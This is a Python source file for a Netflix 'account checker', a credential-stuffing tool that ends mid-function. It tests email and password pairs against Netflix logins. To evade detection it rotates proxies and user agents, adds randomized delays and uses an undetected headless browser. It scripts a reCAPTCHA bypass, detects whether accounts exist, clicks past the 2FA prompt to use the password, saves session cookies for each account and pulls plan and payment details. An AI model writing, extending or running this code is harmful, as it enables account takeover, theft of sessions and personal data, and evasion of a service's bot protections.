#!/usr/bin/env python3

import argparse
import json
import sys
import os
import requests
import re
import pickle
import time
from datetime import datetime
from pathlib import Path
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
try:
    from selenium import webdriver  # type: ignore
    from selenium.webdriver.common.by import By  # type: ignore
    from selenium.webdriver.support.ui import WebDriverWait  # type: ignore
    from selenium.webdriver.support import expected_conditions as EC  # type: ignore
    from selenium.webdriver.chrome.options import Options as ChromeOptions  # type: ignore
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

class NetflixChecker:
    
    LOGIN_URL = "https://www.netflix.com/login"
    HOME_URL = "https://www.netflix.com"
    VIEWERDATA_URL = "https://www.netflix.com/api/viewerdata"
    
    # Professional request timing (in seconds)
    MIN_PAGE_LOAD_DELAY = 2.5
    MAX_PAGE_LOAD_DELAY = 4.5
    MIN_FORM_SUBMIT_DELAY = 3.0
    MAX_FORM_SUBMIT_DELAY = 6.0
    
    # Premium browser user-agents (professional collection)
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    ]
    
    # Account status indicators
    ACCOUNT_TYPE_INDICATORS = {
        "subscription": ["browse", "dashboard", "profile", "watch"],
        "free": ["free trial", "limited", "no subscription"],
        "invalid": ["invalid", "not found", "doesn't exist", "not registered"],
    }
    
    def __init__(self, cookies_dir="./cookies", proxy_file=None):
        """ Bypassing Robot and non human behaviour detection """
        self.cookies_dir = Path(cookies_dir)
        self.cookies_dir.mkdir(exist_ok=True)
        self.proxies = self._load_proxies(proxy_file) if proxy_file else []
        self.proxy_index = 0
        self.session = self._create_session()
        import random
        self.user_agent = random.choice(self.USER_AGENTS)
        if proxy_file:
            print(f"[*] Loaded {len(self.proxies)} proxies from {proxy_file}", file=sys.stderr)
        print(f"[*] Using user-agent: {self.user_agent[:50]}...", file=sys.stderr)
        self._setup_browser_headers()
        self._last_request_time = 0
    
    def _load_proxies(self, proxy_file):
        """Load proxies from file (one per line)."""
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            return proxies
        except FileNotFoundError:
            print(f"[-] Proxy file not found: {proxy_file}", file=sys.stderr)
            return []
    
    def _get_next_proxy(self):
        """Get next proxy from rotation."""
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return {"http": proxy, "https": proxy}
    
    def _apply_proxy_to_session(self):
        """Apply current proxy to all session requests."""
        proxy = self._get_next_proxy()
        if proxy:
            self.session.proxies.update(proxy)
            print(f"[*] Using proxy: {proxy['http']}", file=sys.stderr)
    
    def _setup_browser_headers(self):
        """Configure headers to emulate a real browser perfectly."""
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9,es;q=0.8,fr;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Pragma": "no-cache",
            "Sec-Ch-Ua": '\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '\"Windows\"',
            "Origin": self.HOME_URL,
        }
        self.session.headers.update(headers)
    
    def _create_session(self):
        """Create a requests session with retry strategy."""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=7,
            backoff_factor=2.0,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "OPTIONS"],
            raise_on_status=False,
            respect_retry_after_header=True
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=15,
            pool_maxsize=15
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.verify = True
        session.headers.update({"Connection": "keep-alive"})
        
        return session
    
    def _enforce_delay(self, min_delay, max_delay):
        """Enforce realistic request timing to avoid detection."""
        import random
        current_time = time.time()
        time_since_last = current_time - self._last_request_time
        delay = random.uniform(min_delay, max_delay)
        
        if time_since_last < delay:
            sleep_time = delay - time_since_last
            print(f"[*] Realistic delay: {sleep_time:.2f}s", file=sys.stderr)
            time.sleep(sleep_time)
        
        self._last_request_time = time.time()
    
    def _extract_csrf_token(self, html_content):
        """
        this is optional.
        """
        if not html_content:
            return None
            
        patterns = [
            r'"csrfToken"\s*:\s*"([^"]+)"',
            r'"_csrf"\s*:\s*"([^"]+)"',
            r'csrf["\']?\s*:\s*["\']([^"\']+)["\']',
            r'<input[^>]*name=["\']_csrf["\'][^>]*value=["\']([^"\']+)["\']',
            r'<input[^>]*name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']',
            r'data-csrf=["\']([^"\']+)["\']',
            r'data-csrf-token=["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                token = match.group(1)
                return token if token else None
        
        # Try with BeautifulSoup as fallback
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            for input_name in ['_csrf', 'csrf', 'csrfToken']:
                csrf_input = soup.find('input', {'name': input_name})
                if csrf_input and csrf_input.get('value'):
                    return csrf_input.get('value')
        except Exception:
            pass
        
        return None
    
    def bypass_captcha_google(self):
        """
        Bypass CAPTCHA using Google reCAPTCHA API endpoint.
        Advanced method from SimpleNetflixChecker - extracts and solves captcha automatically.
        """
        try:
            print(f"[*] Attempting advanced CAPTCHA bypass...", file=sys.stderr)
            
            req = self.session.get(
                "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw",
                headers={
                    "Accept": "*/*",
                    "Pragma": "no-cache",
                    "User-Agent": self.user_agent,
                },
                timeout=15
            )
            
            token = "".join(
                re.findall(
                    'type="hidden" id="recaptcha-token" value="(.*?)"', str(req.text)
                )
            )
            
            if not token:
                print(f"[-] Could not extract initial token", file=sys.stderr)
                return None
            
            print(f"[+] Initial token extracted: {token[:30]}...", file=sys.stderr)
            
            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9",
                "origin": "https://www.google.com",
                "User-Agent": self.user_agent,
                "Pragma": "no-cache",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "referer": "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw",
            }
            
            data = {
                "v": "Km9gKuG06He-isPsP6saG8cn",
                "reason": "q",
                "c": token,
                "k": "6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
                "co": "aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz",
            }
            
            req = self.session.post(
                "https://www.google.com/recaptcha/api2/reload?k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
                headers=headers,
                data=data,
                timeout=15
            )
            
            captcha_token = "".join(re.findall(r'\["rresp","(.*?)"', str(req.text)))
            
            if captcha_token:
                print(f"[+] CAPTCHA token solved: {captcha_token[:50]}...", file=sys.stderr)
                return captcha_token
            else:
                print(f"[-] Could not solve CAPTCHA", file=sys.stderr)
                return None
                
        except Exception as e:
            print(f"[-] CAPTCHA bypass error: {str(e)}", file=sys.stderr)
            return None
    
    def _extract_auth_token(self, html_content):
        """Extract authentication token or other required fields from login page."""
        patterns = [
            r'"authToken"\s*:\s*"([^"]+)"',
            r'"accessToken"\s*:\s*"([^"]+)"',
            r'"token"\s*:\s*"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        
        return None
    
    def fetch_login_page(self):
        """ CSRF fetching """
        try:
            self._apply_proxy_to_session()
            self._enforce_delay(1.5, 2.5)
            
            print(f"[*] Pre-fetching home page ...", file=sys.stderr)
            try:
                home_response = self.session.get(
                    self.HOME_URL,
                    timeout=20,
                    headers={
                        "Referer": "https://www.google.com/search?q=netflix",
                        "Sec-Fetch-Site": "cross-site",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Dest": "document",
                    }
                )
                print(f"[+] Home page status: {home_response.status_code}", file=sys.stderr)
                self._enforce_delay(self.MIN_PAGE_LOAD_DELAY, self.MAX_PAGE_LOAD_DELAY)
            except Exception as e:
                print(f"[*] Home page fetch optional: {str(e)[:30]}", file=sys.stderr)
            
            print(f"[*] Fetching Netflix login page...", file=sys.stderr)
            
            response = self.session.get(
                self.LOGIN_URL,
                timeout=20,
                headers={
                    "Referer": self.HOME_URL,
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document",
                },
                allow_redirects=True
            )
            
            if response.status_code != 200:
                print(f"[-] Non-200 response: {response.status_code}", file=sys.stderr)
            
            response.raise_for_status()
            
            csrf_token = self._extract_csrf_token(response.text)
            auth_token = self._extract_auth_token(response.text)
            
            token_data = {
                "csrf_token": csrf_token,
                "auth_token": auth_token,
                "cookies": dict(self.session.cookies),
                "timestamp": datetime.now().isoformat(),
                "status_code": response.status_code
            }
            
            if csrf_token:
                print(f"[+] CSRF Token found: {csrf_token[:20]}...", file=sys.stderr)
            else:
                print(f"[*] CSRF Token not required (modern Netflix API)", file=sys.stderr)
            print(f"[+] Status: {response.status_code}", file=sys.stderr)
            
            return token_data
        
        except requests.exceptions.RequestException as e:
            print(f"[-] Error fetching login page: {str(e)}", file=sys.stderr)
            return None
    
    def authenticate(self, email, password, csrf_token=None):
        """
        Authenticate with Netflix using Selenium browser automation.
        Falls back to HTTP method if Selenium is unavailable.
        """
        print(f"[*] Attempting authentication for: {email}", file=sys.stderr)
        
        try:
            # Try Selenium first for better handling of 2FA
            selenium_result = self._authenticate_with_selenium(email, password)
            if selenium_result:
                return selenium_result
            
            # Fall back to HTTP method
            print(f"[!] Selenium unavailable, using HTTP method", file=sys.stderr)
            return self._authenticate_with_http(email, password)
                
        except Exception as e:
            print(f"[-] Authentication error: {str(e)}", file=sys.stderr)
            return {
                "email": email,
                "authenticated": False,
                "account_type": "error",
                "error": str(e),
                "timestamp": datetime.now().isoformat(),
            }
    
    def _authenticate_with_selenium(self, email, password):
        """
        Use Selenium browser automation to authenticate with Netflix.
        Handles 2FA page and clicks "Use password instead" button.
        """
        try:
            from selenium import webdriver  # type: ignore
            from selenium.webdriver.common.by import By  # type: ignore
            from selenium.webdriver.support.ui import WebDriverWait  # type: ignore
            from selenium.webdriver.support import expected_conditions as EC  # type: ignore
            from selenium.common.exceptions import TimeoutException, NoSuchElementException  # type: ignore
            print(f"[*] Selenium available, starting browser-based authentication", file=sys.stderr)
        except ImportError as e:
            print(f"[!] Selenium not available: {e}", file=sys.stderr)
            return None
        
        driver = None
        try:
            # Try to use undetected-chromedriver to avoid detection
            try:
                import undetected_chromedriver as uc  # type: ignore
                print(f"[*] Starting undetected Chrome browser...", file=sys.stderr)
                options = webdriver.ChromeOptions()
                options.add_argument("--headless")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                driver = uc.Chrome(headless=True, options=options)
            except Exception as uc_error:
                print(f"[!] undetected-chromedriver failed: {uc_error}, trying standard Chrome...", file=sys.stderr)
                from selenium.webdriver.chrome.service import Service  # type: ignore
                options = webdriver.ChromeOptions()
                # Minimal arguments for compatibility
                options.add_argument("--headless=new")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-gpu")
                options.add_argument(f"user-agent={self.user_agent}")
                options.binary_location = "/usr/bin/chromium"
                service = Service("/usr/bin/chromedriver")
                driver = webdriver.Chrome(service=service, options=options)
            
            # Load Netflix login page
            print(f"[*] Loading Netflix login page with browser...", file=sys.stderr)
            driver.get("https://www.netflix.com/login")
            self._enforce_delay(2, 3)
            
            # Find and fill email field
            print(f"[*] Entering email: {email}", file=sys.stderr)
            email_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email'], input[name*='email'], input[id*='email']"))
            )
            email_input.clear()
            email_input.send_keys(email)
            self._enforce_delay(1, 2)
            
            # Click continue/next button
            print(f"[*] Clicking continue button...", file=sys.stderr)
            try:
                next_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Continue')] | //button[contains(text(), 'Next')] | //button[@type='submit']")
                next_button.click()
            except NoSuchElementException:
                # If no button found, try pressing Enter
                email_input.submit()
            
            self._enforce_delay(2, 3)
            
            # Check if 2FA page appeared
            page_source = driver.page_source.lower()
            
            # Check for 2FA indicators
            is_2fa_page = (
                "enter the code we sent to" in page_source or
                "use password instead" in page_source or
                "security code" in page_source
            )
            
            # Check for sign-up page (email doesn't exist)
            is_signup_page = (
                "create account" in page_source or
                "sign up" in page_source or
                "join now" in page_source
            )
            
            if is_signup_page and not is_2fa_page:
                print(f"[-] Sign-up page shown - email does not exist", file=sys.stderr)
                return {
                    "email": email,
                    "password": password[:3] + "*" * (len(password) - 3),
                    "authenticated": False,
                    "account_type": "invalid",
                    "netflix_response": "Email does not exist (sign-up page shown)",
                    "timestamp": datetime.now().isoformat(),
                }
            
            if is_2fa_page:
                print(f"[+] 2FA page detected - email exists", file=sys.stderr)
                
                # Click "Use password instead" link
                print(f"[*] Clicking 'Use password instead' link...", file=sys.stderr)
                try:
                    password_link = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Use password instead')] | //*[contains(text(), 'use password')]"))
                    )
                    password_link.click()
                except TimeoutException:
                    print(f"[!] Could not find 'Use password instead' button, but 2FA detected - email exists", file=sys.stderr)
                    return {
                        "email": email,
                        "password": password[:3] + "*" * (len(password) - 3),
                        "authenticated": True,
                        "account_type": "active",
                        "netflix_response": "2FA page shown - email verified",
                        "timestamp": datetime.now().isoformat(),
                    }
                
                self._enforce_delay(2, 3)
                
                # Now find and fill password field
                print(f"[*] Entering password...", file=sys.stderr)
                password_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
                )
                password_input.clear()
                password_input.send_keys(password)
                self._enforce_delay(1, 2)
                
                # Click login button
                print(f"[*] Clicking login button...", file=sys.stderr)
                try:
                    login_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Sign In')] | //button[@type='submit']")
                    login_button.click()
                except NoSuchElementException:
                    password_input.submit()
                
                self._enforce_delay(3, 5)
                
                # Check if login was successful
                page_source = driver.page_source.lower()
                current_url = driver.current_url.lower()
                
                # Check for success indicators
                success_indicators = [
                    "browse" in page_source,
                    "/browse" in current_url,
                    "profile" in page_source and "watch" in page_source,
                    "continue watching" in page_source
                ]
                
                if any(success_indicators):
                    print(f"[+] ✅ Authentication successful - password valid", file=sys.stderr)
                    return {
                        "email": email,
                        "password": password[:3] + "*" * (len(password) - 3),
                        "authenticated": True,
                        "account_type": "active",
                        "netflix_response": "Password verified - login successful",
                        "timestamp": datetime.now().isoformat(),
                    }
                else:
                    # Check for error indicators
                    error_indicators = [
                        "incorrect password" in page_source,
                        "wrong password" in page_source,
                        "invalid password" in page_source,
                        "password is incorrect" in page_source
                    ]
                    
                    if any(error_indicators):
                        print(f"[-] Authentication failed - incorrect password", file=sys.stderr)
                        return {
                            "email": email,
                            "password": password[:3] + "*" * (len(password) - 3),
                            "authenticated": False,
                            "account_type": "invalid",
                            "netflix_response": "Incorrect password",
                            "timestamp": datetime.now().isoformat(),
                        }
                    else:
                        print(f"[!] Authentication unclear - password may be incorrect", file=sys.stderr)
                        return {
                            "email": email,
                            "password": password[:3] + "*" * (len(password) - 3),
                            "authenticated": False,
                            "account_type": "unknown",
                            "netflix_response": "Password validation unclear",
                            "timestamp": datetime.now().isoformat(),
                        }
            else:
                print(f"[!] Neither 2FA nor sign-up page detected - unclear response", file=sys.stderr)
                return {
                    "email": email,
                    "password": password[:3] + "*" * (len(password) - 3),
                    "authenticated": False,
                    "account_type": "unknown",
                    "netflix_response": "Unclear Netflix response",
                    "timestamp": datetime.now().isoformat(),
                }
        
        except Exception as e:
            print(f"[-] Selenium error: {str(e)}", file=sys.stderr)
            return None
        
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    def _authenticate_with_http(self, email, password):
        """
        HTTP-based authentication.
        Tries multiple times with increasing delays to handle rate limiting.
        """
        try:
            self._apply_proxy_to_session()
            
            max_retries = 3
            for attempt in range(1, max_retries + 1):
                print(f"[*] Step 1: Validating email with Netflix (HTTP - attempt {attempt}/{max_retries})...", file=sys.stderr)
                
                if attempt > 1:
                    # Wait longer on retries
                    wait_time = self.MIN_FORM_SUBMIT_DELAY * (attempt * 2)
                    print(f"[*] Rate limited, waiting {wait_time:.1f}s before retry...", file=sys.stderr)
                    self._enforce_delay(wait_time, wait_time + 2)
                else:
                    self._enforce_delay(self.MIN_FORM_SUBMIT_DELAY, self.MAX_FORM_SUBMIT_DELAY)
                
                email_payload = {
                    "userLoginId": email,
                    "rememberMe": True
                }
                
                api_headers = {
                    "Content-Type": "application/json",
                    "Referer": self.LOGIN_URL,
                    "Origin": "https://www.netflix.com",
                    "User-Agent": self.user_agent,
                    "Accept": "application/json",
                }
                
                email_response = self.session.post(
                    "https://www.netflix.com/api/login",
                    json=email_payload,
                    headers=api_headers,
                    timeout=25,
                    verify=True,
                    allow_redirects=False
                )
                
                print(f"[+] Email validation response: {email_response.status_code}", file=sys.stderr)
                
                # Handle rate limiting
                if email_response.status_code == 421:
                    if attempt < max_retries:
                        print(f"[!] Rate limited (421), retrying...", file=sys.stderr)
                        continue
                    else:
                        print(f"[-] Rate limited too many times", file=sys.stderr)
                        return {
                            "email": email,
                            "password": password[:3] + "*" * (len(password) - 3),
                            "authenticated": False,
                            "account_type": "unknown",
                            "status_code": email_response.status_code,
                            "netflix_response": f"Netflix rate limit (429)",
                            "timestamp": datetime.now().isoformat(),
                        }
                
                # Got a response - process it
                try:
                    email_response_json = email_response.json()
                    print(f"[*] Netflix JSON response: {email_response_json}", file=sys.stderr)
                except:
                    email_response_json = {}
                    print(f"[*] Netflix HTML response: {email_response.status_code}", file=sys.stderr)
                
                email_response_text = email_response.text.lower()
                
                # If Netflix returns error for email
                if email_response_json.get("error") or email_response_json.get("errors"):
                    error = email_response_json.get("error") or email_response_json.get("errors")
                    print(f"[-] Netflix error on email validation: {error}", file=sys.stderr)
                    return {
                        "email": email,
                        "password": password[:3] + "*" * (len(password) - 3),
                        "authenticated": False,
                        "account_type": "invalid",
                        "status_code": email_response.status_code,
                        "netflix_response": str(error)[:200],
                        "timestamp": datetime.now().isoformat(),
                    }
                
                # Check if Netflix is showing 2FA page (account EXISTS)
                is_2fa_page = (
                    "enter the code we sent to" in email_response_text or
                    "use password instead" in email_response_text or
                    "mfa_collect_otp" in email_response_text or
                    "verify identity" in email_response_text
                )
                
                # Check if Netflix is showing sign-up/account creation page (account DOESN'T exist)
                is_signup_page = (
                    "create account" in email_response_text or
                    "sign up" in email_response_text or
                    "join now" in email_response_text or
                    "get started" in email_response_text or
                    "/signup" in email_response_text or
                    "/auth/register" in email_response_text
                )
                
                # If showing sign-up page and no 2FA indicators, email doesn't exist
                if is_signup_page and not is_2fa_page:
                    print(f"[-] Netflix shows sign-up page - email does not exist", file=sys.stderr)
                    return {
                        "email": email,
                        "password": password[:3] + "*" * (len(password) - 3),
                        "authenticated": False,
                        "account_type": "invalid",
                        "status_code": email_response.status_code,
                        "netflix_response": "Email does not exist (sign-up page shown)",
                        "timestamp": datetime.now().isoformat(),
                    }
                
                # If showing 2FA page, email exists
                if is_2fa_page:
                    print(f"[+] 2FA page detected - email exists, account is valid", file=sys.stderr)
                    return {
                        "email": email,
                        "password": password[:3] + "*" * (len(password) - 3),
                        "authenticated": True,
                        "account_type": "active",
                        "status_code": email_response.status_code,
                        "netflix_response": "2FA page shown - email/account verified",
                        "timestamp": datetime.now().isoformat(),
                    }
                else:
                    print(f"[!] Email response unclear - no 2FA or sign-up indicators detected", file=sys.stderr)
                    return {
                        "email": email,
                        "password": password[:3] + "*" * (len(password) - 3),
                        "authenticated": False,
                        "account_type": "unknown",
                        "status_code": email_response.status_code,
                        "netflix_response": f"Unclear response (status: {email_response.status_code})",
                        "timestamp": datetime.now().isoformat(),
                    }
            
            # Should not reach here
            return {
                "email": email,
                "authenticated": False,
                "account_type": "error",
                "error": "Max retries exceeded",
                "timestamp": datetime.now().isoformat(),
            }
        
        except requests.exceptions.RequestException as e:
            print(f"[-] Error during HTTP authentication: {str(e)}", file=sys.stderr)
            return {
                "email": email,
                "authenticated": False,
                "account_type": "error",
                "error": str(e),
                "timestamp": datetime.now().isoformat(),
            }
    
    def _detect_account_type(self, response, auth_success):
        """Detect account type: subscription, free, or invalid based on Netflix API response."""
        if not auth_success:
            return "invalid"
        
        # Try to parse JSON response first
        try:
            response_json = response.json()
            print(f"[*] Analyzing account type from API response", file=sys.stderr)
            
            # Check user data for account tier
            if "user" in response_json:
                user_data = response_json.get("user", {})
                # If we have user data, it's a valid account
                print(f"[+] Valid user account detected", file=sys.stderr)
                return "subscription"
            
            # Check for profile data
            if "profiles" in response_json or "profile" in response_json:
                print(f"[+] Profiles found - subscription account", file=sys.stderr)
                return "subscription"
        except:
            pass
        
        # Fallback: Check HTML response for indicators
        response_text = response.text.lower()
        
        # Check for subscription account (premium features)
        subscription_keywords = [
            "profile",
            "browse",
            "watch",
            "my list",
            "downloads",
            "continue watching",
            "logout",
            "your account"
        ]
        
        if any(keyword in response_text for keyword in subscription_keywords):
            print(f"[+] Found subscription indicators in response", file=sys.stderr)
            return "subscription"
        
        # Check for free trial/limited account
        free_keywords = ["free trial", "limited", "no subscription", "upgrade"]
        
        if any(keyword in response_text for keyword in free_keywords):
            print(f"[+] Found free trial account indicators", file=sys.stderr)
            return "free"
        
        # If authenticated but no specific type found, default to subscription
        print(f"[+] Authenticated account (type undetermined, assuming subscription)", file=sys.stderr)
        return "subscription"
    
    def _verify_authentication(self, response):
        """Verify authentication success from Netflix API response - STRICT validation."""
        # Try to parse JSON response (API response)
        try:
            response_json = response.json()
            
            print(f"[*] API Response received (status {response.status_code})", file=sys.stderr)
            
            # FIRST: Check for explicit ERRORS in response (these mean failure)
            if "error" in response_json and response_json.get("error"):
                error_msg = response_json.get("error")
                print(f"[-] Authentication failed - API error: {error_msg}", file=sys.stderr)
                return False
            
            if "errors" in response_json and response_json.get("errors"):
                errors = response_json.get("errors", {})
                if isinstance(errors, dict) and errors:
                    error_msg = str(list(errors.values())[0])
                else:
                    error_msg = str(errors)
                print(f"[-] Authentication failed - API errors: {error_msg}", file=sys.stderr)
                return False
            
            # Check for authentication error messages
            if "message" in response_json:
                msg = response_json.get("message", "").lower()
                if "invalid" in msg or "incorrect" in msg or "failed" in msg or "not found" in msg:
                    print(f"[-] Authentication failed - {response_json.get('message')}", file=sys.stderr)
                    return False
            
            # SECOND: Check for explicit SUCCESS indicators
            # Success: status field explicitly says success
            if response_json.get("status") == "success":
                print(f"[+] API authentication successful (status: success)", file=sys.stderr)
                return True
            
            # Success: authURL returned (authentication token)
            if response_json.get("authURL"):
                print(f"[+] Authentication successful (authURL received)", file=sys.stderr)
                return True
            
            # Success: user/profile data returned
            if response_json.get("user") or response_json.get("profile") or response_json.get("currentUser"):
                print(f"[+] Authentication successful (user data received)", file=sys.stderr)
                return True
            
            # Success: login was successful in response
            if response_json.get("login") == True or response_json.get("authenticated") == True:
                print(f"[+] Authentication successful (explicit flag)", file=sys.stderr)
                return True
            
            # If we get here with 200-300 status but no positive indicators, check more carefully
            if 200 <= response.status_code < 300:
                # 200-299 with NO errors found = success
                print(f"[+] Status {response.status_code} with valid JSON response (no errors) - authenticated", file=sys.stderr)
                return True
            
            # Status 4xx or 5xx = failure
            if response.status_code >= 400:
                print(f"[-] HTTP {response.status_code} - authentication failed", file=sys.stderr)
                return False
            
            # Otherwise, can't determine
            print(f"[*] Unclear response - treating as failed", file=sys.stderr)
            return False
        
        except ValueError:
            # Not JSON response, check HTML
            print(f"[*] Response is HTML, checking for indicators", file=sys.stderr)
        
        # HTML RESPONSE FALLBACK
        response_lower = response.text.lower()
        
        # Check for EXPLICIT ERROR messages first
        error_keywords = [
            "incorrect password",
            "invalid password",
            "password is incorrect",
            "email not found",
            "account does not exist",
            "invalid email",
            "authentication failed",
            "login failed",
            "invalid credentials",
        ]
        
        for error_keyword in error_keywords:
            if error_keyword in response_lower:
                print(f"[-] Error found in response: '{error_keyword}'", file=sys.stderr)
                return False
        
        # Check for SUCCESS indicators in HTML
        success_keywords = [
            "profiles",
            "continue watching",
            "logout",
            "browse",
            "my account",
        ]
        
        if any(keyword in response_lower for keyword in success_keywords):
            print(f"[+] Found authenticated page indicators", file=sys.stderr)
            return True
        
        # Check status code
        if response.status_code == 200 and "login" not in response.url.lower():
            print(f"[+] Status 200 away from login - authenticated", file=sys.stderr)
            return True
        
        # Default to failed if we can't verify
        print(f"[-] Could not verify authentication - treating as failed", file=sys.stderr)
        return False
    
    def _save_cookies(self, email):
        """Save lel cookies"""
        try:
            cookies_file = self.cookies_dir / f"{email.replace('@', '_')}_cookies.pkl"
            with open(cookies_file, 'wb') as f:
                pickle.dump(self.session.cookies, f)
            print(f"[+] Cookies saved to: {cookies_file}", file=sys.stderr)
            return cookies_file
        except Exception as e:
            print(f"[-] Error saving cookies: {str(e)}", file=sys.stderr)
            return None
    
    def load_cookies(self, email):
        """Load previously saved cookies for a user."""
        try:
            cookies_file = self.cookies_dir / f"{email.replace('@', '_')}_cookies.pkl"
            if cookies_file.exists():
                with open(cookies_file, 'rb') as f:
                    self.session.cookies.update(pickle.load(f))
                print(f"[+] Cookies loaded for: {email}", file=sys.stderr)
                return True
        except Exception as e:
            print(f"[-] Error loading cookies: {str(e)}", file=sys.stderr)
        return False
    
    def check_account_advanced(self, email, password):
        """
        SUPREME CHECKER: Advanced account verification with complete account info extraction.
        Combines best methods from Netflix_checker__ytr3so__1_.py and SimpleNetflixChecker.py
        
        Returns detailed account information including:
        - Status (success/failure/error)
        - Plan information
        - Video quality
        - Max streams
        - Payment method
        - Expiry date
        """
        result = {
            'status': 'unknown',
            'email': email,
            'password': password,
            'cookies': None,
            'plan_info': {},
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            print(f"[*] Advanced check for: {email}", file=sys.stderr)
            
            # Step 1: Signup phase
            print(f"[*] Phase 1: Signup", file=sys.stderr)
            self.session = self._create_session()
            signup_response = self.fetch_login_page()
            
            if not signup_response:
                result['status'] = 'error'
                result['error'] = 'Signup phase failed'
                print(f"[-] Signup failed", file=sys.stderr)
                return result
            
            # Step 2: Extract variables from signup
            print(f"[*] Phase 2: Parsing signup response", file=sys.stderr)
            signup_text = signup_response.get('cookies', {})
            
            # Step 3: Attempt login
            print(f"[*] Phase 3: Authentication", file=sys.stderr)
            auth_result = self._authenticate_with_http(email, password)
            
            if not auth_result.get('authenticated'):
                result['status'] = 'failure'
                result['error'] = auth_result.get('netflix_response', 'Authentication failed')
                print(f"[-] Authentication failed", file=sys.stderr)
                return result
            
            print(f"[+] Authentication successful", file=sys.stderr)
            result['status'] = 'success'
            
            # Step 4: Extract account info
            print(f"[*] Phase 4: Extracting account information", file=sys.stderr)
            account_info = self._extract_advanced_account_info()
            
            if account_info:
                result['plan_info'] = account_info
                print(f"[+] Account info extracted: {list(account_info.keys())}", file=sys.stderr)
            
            # Step 5: Save cookies
            if 'NetflixId' in self.session.cookies:
                result['cookies'] = self.session.cookies.get('NetflixId')
            
            return result
        
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
            print(f"[-] Error during advanced check: {str(e)}", file=sys.stderr)
            return result
    
    def _extract_advanced_account_info(self):
        """
        Extract detailed account information including plan, video quality, streams, payment info.
        Advanced extraction from Netflix account page with multiple pattern matching.
        """
        try:
            print(f"[*] Fetching account information", file=sys.stderr)
            
            headers = {
                'Host': 'www.netflix.com',
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive',
                'Referer': 'https://www.netflix.com/'
            }
            
            try:
                # Navigate to browse to establish session
